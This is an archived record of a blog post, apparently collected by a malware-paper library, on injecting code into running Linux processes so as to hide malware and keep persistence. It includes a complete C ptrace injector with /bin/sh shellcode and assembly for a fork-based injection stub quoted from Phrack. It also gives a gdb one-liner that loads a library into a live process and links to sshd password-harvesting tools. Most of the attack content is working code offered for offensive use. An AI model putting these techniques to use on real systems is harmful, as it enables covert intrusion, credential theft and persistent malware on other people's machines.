{
    "id": "3fd226da-8049-4c69-ab79-d213b02debe3",
    "created_at": "2023-02-16T02:07:52.343463Z",
    "updated_at": "2025-03-27T02:06:02.936258Z",
    "deleted_at": null,
    "sha1_hash": "577b4401b09997f2941f54155fa77d0a10ba1d42",
    "title": "2020-08-16 - Process Injection On Linux",
    "authors": "",
    "file_creation_date": "2023-02-14T06:17:58Z",
    "file_modification_date": "2023-02-14T06:17:58Z",
    "file_size": 501944,
    "plain_text": "# Process Injection On Linux\n\n**jm33.me/process-injection-on-linux.html**\n\n## see also\n\n why do we inject\n\n\nAugust 16, 2020\n\n\nprocess injection can be useful when we need to hide our malware deeper, or when we want\nto add extra persistence to our malware\n\nthere are several ways of doing a process injection on linux. unlike Windows who provides\nmany official APIs for this purpose, on linux we almost always need `PTRACE if we want to`\ninject code to a running process\n\n## LD_PRELOAD\n\n\n-----\n\nthis is the most common technique used by linux malware, it tells the ld loader to load a\nspecific shared object before anything else\n\nyou can also set preload library in `/etc/ld.so.preload`\n\n## PTRACE\n\n PTRACE_POKETEXT / PTRACE_POKEDATA\n\nCopy the word data to the address addr in the tracee's memory. As for PTRACE_PEEKTEXT\nand\nPTRACE_PEEKDATA, these two requests are currently equivalent.\n```\nPOKETEXT modifies the tracee's memory, so we can put our shellcode there, then find a way\n\n```\nto execute it\n\n## execute shellcode\n\n### inject shellcode into RIP-pointed address\n\nby injecting code into current RIP-pointed address, our code gets run as long as we send a\n```\nSIGCONT (with PTRACE_CONT or PTRACE_DETATCH )\n\n```\nbut doing so causes the tracee to crash afterwards if we don't restore its previous state\n\ntheres a great article that covers this method: https://0x00sec.org/t/linux-infectingrunning-processes/1097\n\n\n-----\n\n[here s his code, ive added some comments and corrected some typo:](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)\n\n\n-----\n\n```\n#include <stdint.h>\n\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include <string.h>\n\n#include <sys/ptrace.h>\n\n#include <sys/types.h>\n\n#include <sys/wait.h>\n\n#include <unistd.h>\n\n#include <sys/reg.h>\n\n#include <sys/user.h>\n\n#define SHELLCODE_SIZE 32\n\nunsigned char* shellcode = \"\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\"\n              \"\\xc6\\x48\\x8d\\x3d\\x04\\x00\\x00\\x00\"\n\n              \"\\x04\\x3b\\x0f\\x05\\x2f\\x62\\x69\\x6e\"\n\n              \"\\x2f\\x73\\x68\\x00\\xcc\\x90\\x90\\x90\";\n\nint inject_data(pid_t pid, unsigned char* src, void* dst, int len)\n\n{\n\n  int i;\n\n  uint32_t* s = (uint32_t*)src;\n\n  uint32_t* d = (uint32_t*)dst;\n\n  // The PTRACE_POKETEXT function works on words,\n\n  // so we convert everything to word pointers (32bits) and we also increase i by\n4.\n  for (i = 0; i < len; i += 4, s++, d++) {\n\n    if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {\n\n      perror(\"ptrace(POKETEXT):\");\n\n      return -1;\n\n    }\n\n  }\n\n  return 0;\n\n}\n\nint main(int argc, char* argv[])\n\n{\n\n  pid_t target;\n\n  struct user_regs_struct regs;\n  int syscall;\n\n  long dst;\n\n  if (argc != 2) {\n\n    fprintf(stderr, \"Usage:\\n\\t%s pid\\n\", argv[0]);\n\n    exit(1);\n\n  }\n\n  target = atoi(argv[1]);\n\n  printf(\"+ Tracing process %d\\n\", target);\n\n\n```\n\n-----\n\n```\n  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {\n\n    perror(\"ptrace(ATTACH):\");\n\n    exit(1);\n\n  }\n\n  printf(\"+ Waiting for process...\\n\");\n\n  wait(NULL);\n\n  printf(\"+ Getting Registers\\n\");\n\n  if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {\n\n    perror(\"ptrace(GETREGS):\");\n\n    exit(1);\n\n  }\n\n  /* Inject code into current RIP position */\n\n  // this will execute the shellcode but leave the tracee in a dead state\n\n  printf(\"+ Injecting shell code at %p\\n\", (void*)regs.rip);\n\n  inject_data(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);\n\n  regs.rip += 2; // PTRACE_DEATCH subtracts 2 bytes to the Instruction Pointer\n\n  printf(\"+ Setting instruction pointer to %p\\n\", (void*)regs.rip);\n\n  if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {\n\n    perror(\"ptrace(GETREGS):\");\n\n    exit(1);\n\n  }\n\n  printf(\"+ Run it!\\n\");\n\n  // the shellcode will be run (as it's pointed by RIP) after detaching\n\n  if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {\n\n    perror(\"ptrace(DETACH):\");\n\n    exit(1);\n\n  }\n\n  return 0;\n\n}\n\n### inject without crashing the process\n\n```\nfrom [phrack:](http://phrack.org/issues/59/12.html)\n\n\n-----\n\nI ve seen some injection mechanism used by some ptrace() exploits for\nlinux, which injected a\nstandard shellcode into the memory area pointed\nby %eip. That's the lazy way of doing\ninjection, since the target process\nis screwed up and can't be used again. (crashes or doesn't\nfork)\nWe have to find another way to execute our code in the target process.\nThat's what I was\nthinking and I found this :\n\n1- Get the current eip of the process, and the esp.\n2- Decrement esp by four\n3- Poke eip address\nat the esp address.\n4- Inject the shellcode into esp - 1024 address (Not directly\nbefore the space\npointed by esp, because some shellcodes\nuse the push instruction)\n5- Set register eip as the\nvalue of esp - 1024\n6- Invoke the SETREGS method of ptrace\n7- Detach the process and let it\nopen a root shell for you :)\n\nthis method injects a shellcode that forks a new child process, then inject the real shellcode\ninto it\n\nit has obvious advantage, it runs shellcode in a child process, without affecting the father (the\ntracee, the process that we inject code into)\n\nthe caveat, i assume, is that the child process might be noticeable\n\nThe pusha saves all the registers on the stack, so the process may restore\nthem just after the\nfork. (I say eax and ebx)\nIf the return value of fork is zero, this is the son being executed.\nThere\nwe insert any style of shellcode.\nIf the return value is not zero (but a pid), restore the registers\nand the\npreviously saved eip. The program may continue as if nothing has happened.\n\nthe first two `nop s are due to the same reason that i mentioned:` `PTRACE_DETATCH`\nsubtracts 2 bytes to the Instruction Pointer\n\ncompile the following demo with `gcc -c s1.S, you are going to inject this shellcode to`\nyour target process\n\n\n-----\n\n```\n// all that part has to be done into the injected process\n\n// in other word, this is the injected shellcode\n\n.globl injected_shellcode\n\ninjected_shellcode:\n\n  // ret location has been pushed previously\n\n  nop\n\n  nop\n\n  pusha     // save before anything\n\n  xor %eax, %eax\n\n  mov $0x02, %al // sys_fork\n\n  int $0x80   // fork()\n\n  xor %ebx, %ebx\n\n  cmp %eax, %ebx // father or son ?\n\n  je son    // I'm son\n\n  // here, I'm the father, I've to restore my previous state\n\nfather:\n\n  popa\n\n  ret // return address has been pushed on the stack previously\n\n// code finished for father\n\nson: // standard shellcode, at your choice\n\n  .string \"\"\n\n### load an external library\n\n```\nthis approach needs `dlopen or something similar, basically we need to inject shellcode to`\nrun `dlopen then load our shared object (library)`\n\n[using gdb to load a library is a much better choice](https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html)\n```\necho 'print __libc_dlopen_mode(\"/path/to/library.so\", 2)' | gdb -p <PID>\n\n\n```\nthe library gets loaded into the running PID immediately, and your code gets executed\n\nyou can upload a static-linked gdb binary and try your luck\n\n## weaponize\n\n### sshd inject and password harvesting\n\n[see XPN's ssh-inject tool, he has an article about this, too](https://github.com/xpn/ssh-inject)\n[my own approach](https://jm33.me/sshd-injection-and-password-harvesting.html)\n\n### persistence\n\n\n-----\n\njust write your shared library and put your code there, use any of the injection methods you\nlike\n\n## Proc memory\n\nto be continued\n\n## Comments\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Process Injection/2020-08-16 - Process Injection On Linux.pdf"
    ],
    "report_names": [
        "2020-08-16 - Process Injection On Linux.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1676513272,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1676355478,
    "ts_modification_date": 1676355478,
    "files": {
        "pdf": "https://archive.orkl.eu/577b4401b09997f2941f54155fa77d0a10ba1d42.pdf",
        "text": "https://archive.orkl.eu/577b4401b09997f2941f54155fa77d0a10ba1d42.txt",
        "img": "https://archive.orkl.eu/577b4401b09997f2941f54155fa77d0a10ba1d42.jpg"
    }
}